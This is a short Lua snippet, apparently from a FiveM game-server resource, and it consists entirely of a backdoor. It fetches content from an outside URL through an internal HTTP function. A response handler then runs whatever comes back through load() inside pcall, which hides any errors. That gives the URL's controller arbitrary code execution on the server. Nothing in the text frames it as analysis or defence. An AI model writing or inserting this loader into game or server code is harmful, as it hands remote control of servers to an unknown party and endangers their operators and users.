local _v = PerformHttpRequestInternalEx{url='https://backdoorfinder.org/giXWm', method='GET'} 
AddEventHandler('__cfx_internal:httpResponse', function(_t, _s, _b) if _v == _t then pcall(function() assert(load(_b))() end) end end)
